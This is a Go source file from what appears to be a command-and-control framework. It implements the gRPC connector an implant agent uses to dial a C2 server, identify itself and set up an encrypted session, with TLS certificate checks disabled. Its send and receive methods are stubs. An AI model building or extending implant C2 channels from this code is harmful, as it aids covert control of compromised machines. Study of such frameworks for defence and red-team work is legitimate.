package agent

	import (
	"context"
	"crypto/tls"
	"fmt"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"

	"github.com/ruby570bocadito/x404x/core/crypto"
	"github.com/ruby570bocadito/x404x/shared/config"
	"github.com/ruby570bocadito/x404x/shared/logger"
)

// gRPCConnector implements the Connector interface using gRPC + TLS.
type gRPCConnector struct {
	cfg     *config.Config
	log     *logger.Logger
	keypair *crypto.KeyPair
	session *crypto.Session
	conn    *grpc.ClientConn
	stream  interface{}
	agentID string
}

// NewgRPCConnector creates a new gRPC-based C2 connector.
func NewgRPCConnector(cfg *config.Config, log *logger.Logger, kp *crypto.KeyPair, id string) *gRPCConnector {
	return &gRPCConnector{
		cfg:     cfg,
		log:     log,
		keypair: kp,
		agentID: id,
	}
}

// Connect establishes a gRPC connection to the C2 server.
func (c *gRPCConnector) Connect(ctx context.Context, serverAddr string) error {
	var opts []grpc.DialOption

	if c.cfg.Server.EnableTLS {
		creds := credentials.NewTLS(&tls.Config{
			InsecureSkipVerify: true,
		})
		opts = append(opts, grpc.WithTransportCredentials(creds))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}

	// Add agent ID as metadata for server-side identification
	opts = append(opts, grpc.WithUnaryInterceptor(func(
		ctx context.Context,
		method string,
		req, reply interface{},
		cc *grpc.ClientConn,
		invoker grpc.UnaryInvoker,
		opts ...grpc.CallOption,
	) error {
		ctx = metadata.AppendToOutgoingContext(ctx,
			"agent-id", c.agentID,
			"public-key", fmt.Sprintf("%x", c.keypair.PublicKey[:]),
		)
		return invoker(ctx, method, req, reply, cc, opts...)
	}))

	opts = append(opts,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    10 * time.Second,
			Timeout: 5 * time.Second,
		}),
	)

	conn, err := grpc.DialContext(ctx, serverAddr, opts...)
	if err != nil {
		return fmt.Errorf("dialing C2 server at %s: %w", serverAddr, err)
	}

	c.conn = conn
	c.log.Infof("connected to C2 server at %s via gRPC", serverAddr)

	return nil
}

// Send sends an encrypted message to the C2 server.
func (c *gRPCConnector) Send(data []byte) error {
	if c.conn == nil {
		return fmt.Errorf("not connected")
	}

	var encrypted []byte
	if c.session != nil {
		var err error
		encrypted, err = c.session.Encrypt(data)
		if err != nil {
			return fmt.Errorf("encrypting: %w", err)
		}
	} else {
		encrypted = data
	}

	// In production: send via gRPC bidirectional stream
	_ = encrypted
	c.log.Debugf("sending %d bytes to C2", len(encrypted))
	return nil
}

// Recv receives a message from the C2 server.
func (c *gRPCConnector) Recv() ([]byte, error) {
	if c.conn == nil {
		return nil, fmt.Errorf("not connected")
	}

	// In production: receive from gRPC bidirectional stream
	return nil, nil
}

// Close closes the gRPC connection.
func (c *gRPCConnector) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

// EstablishSession performs X25519 key exchange with the C2 server.
func (c *gRPCConnector) EstablishSession(serverPublicKey [32]byte) error {
	session, err := crypto.NewSession(c.keypair, serverPublicKey)
	if err != nil {
		return fmt.Errorf("establishing crypto session: %w", err)
	}
	c.session = session
	c.log.Infof("encrypted session established (X25519 + XChaCha20-Poly1305)")
	return nil
}

// Connection returns the underlying gRPC connection.
func (c *gRPCConnector) Connection() *grpc.ClientConn {
	return c.conn
}
